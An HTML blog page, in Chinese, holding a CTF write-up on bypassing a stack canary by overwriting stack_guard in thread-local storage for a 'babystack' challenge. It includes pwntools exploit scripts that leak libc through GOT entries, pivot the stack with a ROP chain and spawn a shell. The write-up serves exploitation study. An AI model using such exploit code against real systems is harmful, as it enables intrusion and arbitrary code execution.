@@ -1,0 +1,697 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Canary-TLS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Canary-TLS">
+<meta property="og:url" content="http://yoursite.com/2019/01/13/Canary-TSL/index.html">
+<meta property="og:site_name" content="Archer">
+<meta property="og:description" content="Canary-TLS">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/0069xUlxly1fz4r96l99cj30md0gpn32.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/0069xUlxly1fz4r974g3oj30dj0e50tb.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/0069xUlxly1fz4r96t94rj30qv0hjaga.jpg">
+<meta property="og:updated_time" content="2019-05-13T11:01:26.601Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Canary-TLS">
+<meta name="twitter:description" content="Canary-TLS">
+<meta name="twitter:image" content="https://ws1.sinaimg.cn/large/0069xUlxly1fz4r96l99cj30md0gpn32.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/01/13/Canary-TSL/"/>
+
+
+
+
+
+  <title>Canary-TLS | Archer</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Archer</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/13/Canary-TSL/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Fake Student">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Archer">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Canary-TLS</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-13T09:01:27+08:00">
+                2019-01-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>Canary-TLS<br><a id="more"></a></p>
+<p>参考<a href="http://eternalsakura13.com/2018/04/24/starctf_babystack/" target="_blank" rel="noopener">Sakura</a>师傅博客</p>
+<ul>
+<li>关于为什么可以这么做，师傅已经写了很详细了，我就不再重复了</li>
+</ul>
+<h2 id="个人理解"><a href="#个人理解" class="headerlink" title="个人理解"></a>个人理解</h2><p>因为本题实例中是利用mmap来创建线程，而每个线程被创建的时都会有一个变量值的副本。在glibc的直线中，TLS被指向一个segment register fs(x86-64上)，它的结构体中有一个<strong>stack_guard</strong>的变量。它就是用来存储canary的值，和栈上的canary异或结果是否为0，然后决定是否呼叫 <strong>__stack_chk_fail</strong>函数<br>[2]<br>而这个副本结构体是存放在栈上高地址上，如果满足一定条件便可以覆盖次结构体中的随机数<strong>stack_guard</strong>,从而绕过<strong>canary</strong>保护,接下来便是简单的泄露<strong>libc</strong>地址，重新呼叫<strong>read</strong>函数读入<strong>one_gadaget</strong>,然后利用<strong>leave_ret</strong>跳转即可</p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><ul>
+<li>题目给了0x10000的可填充空间，远远满足覆盖<strong>stack_guard</strong>条件。</li>
+<li>给栈上canary数以及stack_guard设置相同数来绕过<strong>canary</strong>保护</li>
+<li><p>可以利用searchmem 来寻找两个<strong>canary</strong>偏移量最后设置相同值。<br><img src="https://ws1.sinaimg.cn/large/0069xUlxly1fz4r96l99cj30md0gpn32.jpg" alt=""></p>
+</li>
+<li><p>s在rbp-0x1010,再加上old rbp即8个字节，到返回地址前一共是0x1018个字节。</p>
+</li>
+<li>也可以用pattc和patto来寻找<br><img src="https://ws1.sinaimg.cn/large/0069xUlxly1fz4r974g3oj30dj0e50tb.jpg" alt=""><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2></li>
+</ul>
+<h3 id="设置两个canary的值都为deadbeef"><a href="#设置两个canary的值都为deadbeef" class="headerlink" title="设置两个canary的值都为deadbeef"></a>设置两个canary的值都为deadbeef</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binary=ELF(<span class="string">'./bs'</span>)</span><br><span class="line">libc=binary.libc</span><br><span class="line">context.arch=binary.arch</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">p=process(<span class="string">"./bs"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"send?\n"</span>,str(<span class="number">0x1</span>))</span><br><span class="line">payload=<span class="string">"B"</span>*(<span class="number">0x1000</span>+<span class="number">0x8</span>)</span><br><span class="line">payload=payload+p64(<span class="number">0xdeadbeef</span>)  <span class="comment">#栈上canary</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x17e8</span>,<span class="string">"B"</span>)</span><br><span class="line">payload=payload+p64(<span class="number">0xdeadbeef</span>) <span class="comment">#结构体中canary</span></span><br><span class="line">payload=<span class="string">"A"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"len:"</span>,hex(len(payload))</span><br><span class="line">gdb.attach(p,<span class="string">'''</span></span><br><span class="line"><span class="string">thread 2 </span></span><br><span class="line"><span class="string">b *0x400a82'''</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h3><ul>
+<li>为了方便可以直接将填充的值设置为\x00<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Canary3-TSL</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./bs"</span>)</span><br><span class="line"><span class="comment">#p=remote("10.21.13.69",10011)</span></span><br><span class="line">elf=ELF(<span class="string">"./bs"</span>)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line">read_plt=<span class="number">0x4007E0</span></span><br><span class="line">read_got=<span class="number">0x601fd0</span></span><br><span class="line">fgets_got=<span class="number">0x601FE0</span></span><br><span class="line">puts_plt=<span class="number">0x4007c0</span></span><br><span class="line">puts_got=<span class="number">0x601fb0</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x400bc3</span></span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x0400bc1</span></span><br><span class="line">pop_rbp_ret=<span class="number">0x400870</span></span><br><span class="line">bss=<span class="number">0x00603000</span><span class="number">-0x100</span></span><br><span class="line">leave_ret=<span class="number">0x400955</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">'''b *0x4009e6'''</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil("How many bytes do you want to send?\n")</span></span><br><span class="line">p.sendlineafter(<span class="string">"send?"</span>,str(<span class="number">0x1900</span>))   <span class="comment">#2000 why can't</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'\x00'</span>*<span class="number">0x1010</span>+p64(read_got)+p64(pop_rdi_ret)+p64(fgets_got)+p64(puts_plt)</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">0</span>)+p64(pop_rsi_r15_ret)+p64(bss)+p64(<span class="number">0</span>)+p64(read_plt)</span><br><span class="line">payload+=p64(pop_rbp_ret)+p64(bss<span class="number">-8</span>)+p64(leave_ret)</span><br><span class="line">	</span><br><span class="line">payload=payload.ljust(<span class="number">0x1900</span>,<span class="string">"\x00"</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.readuntil(<span class="string">"goodbye.\n"</span>)</span><br><span class="line"><span class="comment">#print "read:",hex(libc.symbols["read"])   read() can't     </span></span><br><span class="line">base=u64(p.read(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-libc.symbols[<span class="string">"fgets"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"base:"</span>,hex(base)</span><br><span class="line">libc.address=base</span><br><span class="line">payload1=p64(pop_rdi_ret)+p64(libc.search(<span class="string">"/bin/sh"</span>).next())+p64(libc.symbols[<span class="string">"system"</span>])</span><br><span class="line"><span class="comment">#payload1=p64(base+0xf1147)</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><ul>
+<li>不知道为何利用字符串/bin/sh呼叫system失败，只能用one_gadget</li>
+</ul>
+<h3 id="安装one-gadget"><a href="#安装one-gadget" class="headerlink" title="安装one_gadget"></a>安装<a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener">one_gadget</a></h3><pre><code>sudo apt install ruby
+sudo gem install one_gadget
+</code></pre><p><img src="https://ws1.sinaimg.cn/large/0069xUlxly1fz4r96t94rj30qv0hjaga.jpg" alt=""></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/12/05/smashes-ssp/" rel="next" title="Stack Smashing Protector--SSP">
+                <i class="fa fa-chevron-left"></i> Stack Smashing Protector--SSP
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/01/13/Canary-fork/" rel="prev" title="Canary-fork">
+                Canary-fork <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Fake Student</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#个人理解"><span class="nav-number">1.</span> <span class="nav-text">个人理解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目分析"><span class="nav-number">2.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP"><span class="nav-number">3.</span> <span class="nav-text">EXP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#设置两个canary的值都为deadbeef"><span class="nav-number">3.1.</span> <span class="nav-text">设置两个canary的值都为deadbeef</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#完整EXP"><span class="nav-number">3.2.</span> <span class="nav-text">完整EXP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#问题"><span class="nav-number">3.2.1.</span> <span class="nav-text">问题</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#安装one-gadget"><span class="nav-number">3.3.</span> <span class="nav-text">安装one_gadget</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Fake Student</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
